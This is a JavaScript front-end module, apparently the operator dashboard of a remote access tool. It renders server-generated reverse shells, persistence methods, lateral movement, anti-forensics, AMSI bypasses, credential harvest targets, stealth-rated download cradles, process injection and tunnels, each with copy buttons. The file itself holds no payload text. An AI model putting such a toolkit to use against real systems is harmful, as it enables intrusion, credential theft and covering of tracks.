            html += `<div>${d.device} — ${d.free_gb}GB free / ${d.total_gb}GB (${d.percent}% used)</div>`;
        }
        html += `</div></div>`;

        // Users
        const usr = data.users || {};
        html += `<div class="bg-slate-800/80 rounded-lg p-3 border border-purple-700/30">
            <h5 class="text-xs font-bold text-purple-400 mb-2"><i class="fas fa-user mr-1"></i>User Info</h5>
            <div class="space-y-1 text-xs text-slate-300">
                <div><span class="text-slate-500">User:</span> ${usr.current_user}</div>
                <div><span class="text-slate-500">Home:</span> ${usr.home_dir}</div>
                <div><span class="text-slate-500">Admin:</span> <span class="text-${usr.is_admin ? 'green' : 'yellow'}-400">${usr.is_admin ? 'YES' : 'NO'}</span></div>
            </div>
        </div>`;

        // Top Processes
        html += `<div class="bg-slate-800/80 rounded-lg p-3 border border-slate-600/30">
            <h5 class="text-xs font-bold text-slate-300 mb-2"><i class="fas fa-microchip mr-1"></i>Top Processes (by CPU)</h5>
            <div class="space-y-0.5 text-xs text-slate-400 max-h-[120px] overflow-y-auto">`;
        for (const p of (data.processes || []).slice(0, 10)) {
            html += `<div class="flex justify-between"><span>${p.name} (${p.pid})</span><span>CPU: ${p.cpu}% | RAM: ${p.memory}%</span></div>`;
        }
        html += `</div></div>`;
        html += '</div>';

        $('#rat-recon-result').html(html).removeClass('hidden');
        this.showResult('System Reconnaissance', data);
    },

    showShellsResult(data) {
        let html = '<div class="space-y-3">';
        html += `<div class="bg-slate-800/60 rounded-lg p-3 border border-green-700/40">
            <div class="flex items-center gap-2 text-xs text-green-400 font-mono">
                <i class="fas fa-headphones"></i>
                <span>Listener: <code class="bg-slate-900 px-2 py-0.5 rounded">${data.listener_command}</code></span>
                <button class="rat-copy-btn text-slate-500 hover:text-green-400" data-cmd="${data.listener_command}"><i class="fas fa-copy"></i></button>
            </div>
        </div>`;

        for (const [key, shell] of Object.entries(data.shells || {})) {
            const langColors = { bash: 'green', python: 'yellow', powershell: 'blue', php: 'indigo', ruby: 'red', perl: 'orange', netcat: 'teal', java: 'amber', javascript: 'emerald', go: 'cyan', msfvenom: 'rose' };
            const color = langColors[shell.language] || 'slate';
            html += `
            <div class="bg-slate-800/60 rounded-lg border border-${color}-700/30 p-3">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-xs font-bold text-${color}-400"><i class="fas fa-terminal mr-1"></i>${shell.name}</span>
                    <div class="flex items-center gap-2">
                        <span class="text-xs text-slate-500">${shell.requires || ''}</span>
                        <button class="rat-copy-btn text-slate-500 hover:text-white text-xs px-1.5 py-0.5 rounded bg-slate-700" data-cmd="${this.escapeHtml(shell.command)}"><i class="fas fa-copy mr-1"></i>Copy</button>
                    </div>
                </div>
                <div class="rat-cmd-block"><code class="text-xs text-slate-300 font-mono break-all block bg-slate-950 rounded p-2 max-h-[100px] overflow-auto">${this.escapeHtml(shell.command)}</code></div>
                ${shell.encoded ? `<div class="mt-2"><span class="text-xs text-slate-500">Encoded:</span><code class="text-xs text-slate-400 font-mono break-all block bg-slate-950 rounded p-2 mt-1 max-h-[60px] overflow-auto">${this.escapeHtml(shell.encoded)}</code></div>` : ''}
            </div>`;
        }
        html += '</div>';

        $('#rat-shells-result').html(html).removeClass('hidden');
        this.showResult(`Reverse Shells (${data.total} generated)`, data);
    },

    showPersistenceResult(data) {
        let html = '<div class="space-y-3">';
        const riskColors = { low: 'green', medium: 'yellow', high: 'orange', critical: 'red' };

        for (const [key, m] of Object.entries(data.methods || {})) {
            const rc = riskColors[m.risk_level] || 'slate';
            html += `
            <div class="bg-slate-800/60 rounded-lg border border-${rc}-700/30 p-4">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-sm font-bold text-white">${m.name}</span>
                    <div class="flex items-center gap-2">
                        <span class="text-xs px-2 py-0.5 rounded-full bg-${rc}-500/20 text-${rc}-400">${m.risk_level}</span>
                        <span class="text-xs text-slate-500">Survives: ${m.survival || 'N/A'}</span>
                    </div>
                </div>
                <p class="text-xs text-slate-400 mb-3">${m.description}</p>
                ${m.install_cmd ? `
                <div class="mb-2">
                    <div class="flex items-center justify-between mb-1"><span class="text-xs text-green-400 font-bold">Install</span>
                        <button class="rat-copy-btn text-slate-500 hover:text-white text-xs px-1.5 py-0.5 rounded bg-slate-700" data-cmd="${this.escapeHtml(m.install_cmd)}"><i class="fas fa-copy"></i></button>
                    </div>
                    <div class="rat-cmd-block"><code class="text-xs text-slate-300 font-mono break-all block bg-slate-950 rounded p-2 max-h-[80px] overflow-auto">${this.escapeHtml(m.install_cmd)}</code></div>
                </div>` : ''}
                ${m.cleanup_cmd ? `
                <div class="mb-2">
                    <div class="flex items-center justify-between mb-1"><span class="text-xs text-red-400 font-bold">Cleanup</span>
                        <button class="rat-copy-btn text-slate-500 hover:text-white text-xs px-1.5 py-0.5 rounded bg-slate-700" data-cmd="${this.escapeHtml(m.cleanup_cmd)}"><i class="fas fa-copy"></i></button>
                    </div>
                    <div class="rat-cmd-block"><code class="text-xs text-red-300/70 font-mono break-all block bg-slate-950 rounded p-2 max-h-[60px] overflow-auto">${this.escapeHtml(m.cleanup_cmd)}</code></div>
                </div>` : ''}
                ${m.technique ? `<span class="text-xs text-slate-500"><i class="fas fa-crosshairs mr-1"></i>MITRE: ${m.technique}</span>` : ''}
                ${m.detection_notes ? `<p class="text-xs text-slate-500 mt-1"><i class="fas fa-eye mr-1"></i>${m.detection_notes}</p>` : ''}
            </div>`;
        }
        html += '</div>';

        $('#rat-persist-result').html(html).removeClass('hidden');
        this.showResult(`Persistence (${data.os} — ${data.total_methods} methods)`, data);
    },

    showLateralResult(data) {
        let html = '<div class="space-y-3">';
        for (const [key, t] of Object.entries(data.techniques || {})) {
            const riskColors = { medium: 'yellow', high: 'orange', critical: 'red' };
            const rc = riskColors[t.risk_level] || 'slate';
            html += `
            <div class="bg-slate-800/60 rounded-lg border border-${rc}-700/30 p-4">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-sm font-bold text-white">${t.name}</span>
                    <div class="flex items-center gap-2">
                        <span class="text-xs px-2 py-0.5 rounded-full bg-${rc}-500/20 text-${rc}-400">${t.risk_level}</span>
                        ${t.mitre ? `<span class="text-xs text-slate-500">${t.mitre}</span>` : ''}
                    </div>
                </div>
                <p class="text-xs text-slate-400 mb-3">${t.description}</p>`;

            if (t.commands) {
                for (const [tool, cmd] of Object.entries(t.commands)) {
                    html += `<div class="mb-2">
                        <div class="flex items-center justify-between mb-1">
                            <span class="text-xs text-sky-400 font-bold">${tool}</span>
                            <button class="rat-copy-btn text-slate-500 hover:text-white text-xs px-1.5 py-0.5 rounded bg-slate-700" data-cmd="${this.escapeHtml(cmd)}"><i class="fas fa-copy"></i></button>
                        </div>
                        <div class="rat-cmd-block"><code class="text-xs text-slate-300 font-mono break-all block bg-slate-950 rounded p-2">${this.escapeHtml(cmd)}</code></div>
                    </div>`;
                }
            }
            html += `<p class="text-xs text-slate-500 mt-1"><i class="fas fa-eye mr-1"></i>${t.detection || ''}</p></div>`;
        }
        html += '</div>';

        $('#rat-lateral-result').html(html).removeClass('hidden');
        this.showResult(`Lateral Movement (${data.total} techniques)`, data);
    },

    showAntiForensicsResult(data) {
        let html = '<div class="space-y-3">';
        for (const [key, t] of Object.entries(data.techniques || {})) {
            html += `<div class="bg-slate-800/60 rounded-lg border border-rose-700/30 p-4">
                <h5 class="text-sm font-bold text-white mb-2">${t.name}</h5>
                <p class="text-xs text-slate-400 mb-3">${t.description}</p>`;

            // Handle array of commands
            if (Array.isArray(t.commands)) {
                html += '<div class="space-y-1">';
                for (const cmd of t.commands) {
                    html += `<div class="flex items-center gap-2">
                        <code class="flex-1 text-xs text-rose-300 font-mono bg-slate-950 rounded px-2 py-1">${this.escapeHtml(cmd)}</code>
                        <button class="rat-copy-btn text-slate-500 hover:text-white text-xs" data-cmd="${this.escapeHtml(cmd)}"><i class="fas fa-copy"></i></button>
                    </div>`;
                }
                html += '</div>';
            }
            // Handle object of commands
            else if (typeof t.commands === 'object' && t.commands) {
                for (const [tool, cmd] of Object.entries(t.commands)) {
                    html += `<div class="mb-2">
                        <span class="text-xs text-rose-400 font-bold">${tool}:</span>
                        <div class="flex items-center gap-2 mt-1">
                            <code class="flex-1 text-xs text-slate-300 font-mono bg-slate-950 rounded px-2 py-1 break-all">${this.escapeHtml(cmd)}</code>
                            <button class="rat-copy-btn text-slate-500 hover:text-white text-xs" data-cmd="${this.escapeHtml(cmd)}"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>`;
                }
            }
            // Handle techniques array (AMSI bypasses)
            if (t.techniques) {
                html += '<div class="space-y-2 mt-2">';
                for (const tech of (Array.isArray(t.techniques) ? t.techniques : Object.entries(t.techniques).map(([k,v]) => ({name: k, ...( typeof v === 'string' ? {description: v} : v)}))) ) {
                    html += `<div class="bg-slate-900/60 rounded p-2">
                        <span class="text-xs font-bold text-rose-300">${tech.name}</span>
                        ${tech.code ? `<code class="text-xs text-slate-400 font-mono block mt-1 break-all">${this.escapeHtml(tech.code)}</code>` : ''}
                        ${tech.description ? `<p class="text-xs text-slate-500 mt-1">${tech.description}</p>` : ''}
                    </div>`;
                }
                html += '</div>';
            }

            if (t.detection) html += `<p class="text-xs text-slate-500 mt-2"><i class="fas fa-eye mr-1"></i>${t.detection}</p>`;
            html += '</div>';
        }
        html += '</div>';

        $('#rat-af-result').html(html).removeClass('hidden');
        this.showResult(`Anti-Forensics (${data.target_os})`, data);
    },

    showCredTargetsResult(data) {
        let html = '<div class="space-y-4">';

        // Browser Credentials
        html += '<h4 class="text-sm font-bold text-amber-400"><i class="fas fa-globe mr-2"></i>Browser Credentials</h4>';
        html += '<div class="grid grid-cols-1 md:grid-cols-3 gap-3">';
        for (const [key, browser] of Object.entries(data.browser_credentials || {})) {
            html += `<div class="bg-slate-800/60 rounded-lg border border-slate-700/50 p-3">
                <h5 class="text-xs font-bold text-white mb-2">${browser.icon} ${browser.name}</h5>
                <div class="space-y-1 text-xs text-slate-400">`;
            for (const [platform, paths] of Object.entries(browser).filter(([k]) => ['windows', 'linux'].includes(k))) {
                html += `<div class="text-slate-500 font-bold mt-1">${platform}:</div>`;
                for (const [name, path] of Object.entries(paths)) {
                    html += `<div class="flex justify-between"><span>${name}:</span><code class="text-slate-300 text-xs">${path}</code></div>`;
                }
            }
            html += `<div class="mt-1 text-slate-500">Method: ${browser.method}</div>`;
            html += '</div></div>';
        }
        html += '</div>';

        // Cloud Tokens
        html += '<h4 class="text-sm font-bold text-sky-400 mt-4"><i class="fas fa-cloud mr-2"></i>Cloud Tokens</h4>';
        html += '<div class="grid grid-cols-1 md:grid-cols-3 gap-3">';
        for (const [provider, info] of Object.entries(data.cloud_tokens || {})) {
            html += `<div class="bg-slate-800/60 rounded-lg border border-slate-700/50 p-3">
                <h5 class="text-xs font-bold text-white mb-2">${provider.toUpperCase()}</h5>
                <div class="space-y-1 text-xs text-slate-400">`;
            for (const [k, v] of Object.entries(info)) {
                if (k === 'env_vars') {
                    html += `<div class="text-slate-500">Env: ${v.join(', ')}</div>`;
                } else {
                    html += `<div><span class="text-slate-500">${k}:</span> <code class="text-slate-300">${v}</code></div>`;
                }
            }
            html += '</div></div>';
        }
        html += '</div>';

        html += '</div>';
        this.showResult('Credential Harvest Targets', data);
        $('#rat-result-visual').html(html);
    },

    showCradlesResult(data) {
        let html = '<div class="space-y-2">';
        for (const [key, cradle] of Object.entries(data.cradles || {})) {
            const platformColors = { windows: 'blue', linux: 'green', 'cross-platform': 'purple' };
            const pc = platformColors[cradle.platform] || 'slate';
            html += `<div class="bg-slate-800/60 rounded-lg border border-${pc}-700/30 p-3">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-xs font-bold text-${pc}-400">${cradle.name}</span>
                    <div class="flex items-center gap-2">
                        <span class="text-xs text-slate-500">${cradle.platform}</span>
                        <span class="text-xs px-1.5 py-0.5 rounded bg-slate-700 text-slate-400">Stealth: ${cradle.stealth || 'N/A'}</span>
                        <button class="rat-copy-btn text-slate-500 hover:text-white text-xs px-1.5 py-0.5 rounded bg-slate-700" data-cmd="${this.escapeHtml(cradle.command)}"><i class="fas fa-copy"></i></button>
                    </div>
                </div>
                <div class="rat-cmd-block"><code class="text-xs text-slate-300 font-mono break-all block bg-slate-950 rounded p-2">${this.escapeHtml(cradle.command)}</code></div>
            </div>`;
        }
        html += '</div>';

        this.showResult(`Download Cradles (${data.total})`, data);
        $('#rat-result-visual').html(html);
    },

    showInjectionResult(data) {
        let html = '<div class="space-y-3">';
        for (const [key, t] of Object.entries(data.techniques || {})) {
            const riskColors = { medium: 'yellow', high: 'orange', critical: 'red' };
            const rc = riskColors[t.risk] || 'slate';
            html += `<div class="bg-slate-800/60 rounded-lg border border-purple-700/30 p-4">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-sm font-bold text-white">${t.name}</span>
                    <div class="flex items-center gap-2">
                        <span class="text-xs px-2 py-0.5 rounded-full bg-${rc}-500/20 text-${rc}-400">${t.risk}</span>
                        <span class="text-xs text-slate-500">${t.mitre}</span>
                    </div>
                </div>
                <p class="text-xs text-slate-400 mb-3">${t.description}</p>`;
            if (t.steps) {
                html += '<ol class="list-decimal list-inside space-y-1 text-xs text-slate-300 mb-2">';
                for (const step of t.steps) {
                    html += `<li>${step}</li>`;
                }
                html += '</ol>';
            }
            if (t.target_processes) {
                html += `<div class="text-xs text-slate-500"><i class="fas fa-crosshairs mr-1"></i>Targets: ${t.target_processes.join(', ')}</div>`;
            }
            if (t.detectable_by) {
                html += `<div class="text-xs text-slate-500 mt-1"><i class="fas fa-eye mr-1"></i>Detection: ${t.detectable_by.join(', ')}</div>`;
            }
            html += '</div>';
        }
        html += '</div>';

        this.showResult('Process Injection Techniques', data);
        $('#rat-result-visual').html(html);
    },

    showEncoderResult(data) {
        let html = `<div class="text-xs text-slate-400 mb-3">Original length: ${data.original_length} chars</div>`;
        html += '<div class="space-y-3">';
        for (const [key, enc] of Object.entries(data.encodings || {})) {
            html += `<div class="bg-slate-800/60 rounded-lg border border-cyan-700/30 p-3">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-xs font-bold text-cyan-400">${enc.name}</span>
                    <button class="rat-copy-btn text-slate-500 hover:text-white text-xs px-1.5 py-0.5 rounded bg-slate-700" data-cmd="${this.escapeHtml(enc.encoded)}"><i class="fas fa-copy mr-1"></i>Copy</button>
                </div>
                <code class="text-xs text-slate-300 font-mono break-all block bg-slate-950 rounded p-2 max-h-[80px] overflow-auto">${this.escapeHtml(enc.encoded)}</code>`;
            // Show decoders
            for (const [dk, dv] of Object.entries(enc).filter(([k]) => k.startsWith('decoder_'))) {
                const decoderName = dk.replace('decoder_', '');
                html += `<div class="mt-1">
                    <div class="flex items-center justify-between">
                        <span class="text-xs text-slate-500">Decoder (${decoderName}):</span>
                        <button class="rat-copy-btn text-slate-500 hover:text-white text-xs" data-cmd="${this.escapeHtml(dv)}"><i class="fas fa-copy"></i></button>
                    </div>
                    <code class="text-xs text-green-400/70 font-mono break-all block bg-slate-950 rounded p-1.5 mt-0.5">${this.escapeHtml(dv)}</code>
                </div>`;
            }
            html += '</div>';
        }
        html += '</div>';

        this.showResult(`Payload Encodings (${data.total})`, data);
        $('#rat-result-visual').html(html);
    },

    showTunnelsResult(data) {
        let html = '<div class="space-y-3">';
        for (const [key, t] of Object.entries(data.tunnels || {})) {
            html += `<div class="bg-slate-800/60 rounded-lg border border-teal-700/30 p-3">
                <div class="flex items-center justify-between mb-2">
                    <span class="text-xs font-bold text-teal-400">${t.name}</span>
                </div>
                ${t.description ? `<p class="text-xs text-slate-400 mb-2">${t.description}</p>` : ''}`;
            if (t.command) {
                html += `<div class="flex items-center gap-2 mb-1">
                    <code class="flex-1 text-xs text-slate-300 font-mono bg-slate-950 rounded px-2 py-1.5 break-all">${this.escapeHtml(t.command)}</code>
                    <button class="rat-copy-btn text-slate-500 hover:text-white text-xs" data-cmd="${this.escapeHtml(t.command)}"><i class="fas fa-copy"></i></button>
                </div>`;
            }
            // Additional fields (server, client, etc.)
            for (const [fk, fv] of Object.entries(t).filter(([k]) => !['name', 'description', 'command'].includes(k))) {
                if (typeof fv === 'string') {
                    html += `<div class="flex items-center gap-2 mt-1">
                        <span class="text-xs text-slate-500">${fk}:</span>
                        <code class="text-xs text-slate-300 font-mono">${this.escapeHtml(fv)}</code>
                        <button class="rat-copy-btn text-slate-500 hover:text-white text-xs" data-cmd="${this.escapeHtml(fv)}"><i class="fas fa-copy"></i></button>
                    </div>`;
                }
            }
            html += '</div>';
        }
        html += '</div>';

        this.showResult(`Network Tunnels (${data.total})`, data);
        $('#rat-result-visual').html(html);
    },

    // =============== HISTORY ===============

    async loadHistory() {
        try {
            const res = await $.getJSON('/api/rat/history');
            const list = $('#rat-history-list');
            if (!list.length) return;
            if (!res.records || !res.records.length) {
                list.html('<p class="text-xs text-slate-500 text-center py-4">No operations recorded yet</p>');
                return;
            }
            let html = '';
            const typeIcons = {
                recon: 'fa-search text-emerald-400',
                shell: 'fa-terminal text-rose-400',
                persistence: 'fa-anchor text-violet-400',
                lateral_movement: 'fa-arrows-alt text-sky-400',
                anti_forensics: 'fa-eye-slash text-pink-400',
                download_cradle: 'fa-download text-red-400',
                c2_config: 'fa-satellite-dish text-orange-400',
                tunnel: 'fa-dungeon text-teal-400',
            };
            for (const r of res.records) {
                const icon = typeIcons[r.operation_type] || 'fa-cog text-slate-400';
                const time = new Date(r.created_at).toLocaleString();
                html += `<div class="flex items-center justify-between bg-slate-800/40 rounded-lg px-3 py-2 border border-slate-700/30">
                    <div class="flex items-center gap-3">
                        <i class="fas ${icon}"></i>
                        <div>
                            <span class="text-xs font-bold text-white">${r.name || r.operation_type}</span>
                            <span class="text-xs text-slate-500 ml-2">${r.target_os || ''}</span>
                            ${r.risk_level ? `<span class="text-xs px-1.5 py-0.5 rounded-full ml-2 bg-${r.risk_level === 'critical' ? 'red' : r.risk_level === 'high' ? 'orange' : 'yellow'}-500/20 text-${r.risk_level === 'critical' ? 'red' : r.risk_level === 'high' ? 'orange' : 'yellow'}-400">${r.risk_level}</span>` : ''}
                        </div>
                    </div>
                    <div class="flex items-center gap-2">
                        <span class="text-xs text-slate-500">${time}</span>
                        <button class="btn-delete-rat text-slate-500 hover:text-red-400 text-xs" data-id="${r.id}"><i class="fas fa-trash"></i></button>
                    </div>
                </div>`;
            }
            list.html(html);
        } catch(e) { console.error('RAT history load error:', e); }
    },

    async deleteRecord(id) {
        try {
            await $.ajax({ url: `/api/rat/${id}`, method: 'DELETE' });
            this.loadHistory();
            GrowlNotification.notify({ title: 'Deleted', description: 'Record removed', type: 'success', position: 'top-right', closeTimeout: 2000 });
        } catch(e) { Swal.fire('Error', 'Delete failed', 'error'); }
    },

    // =============== UTILS ===============

    escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = String(text);
        return div.innerHTML;
    },
};
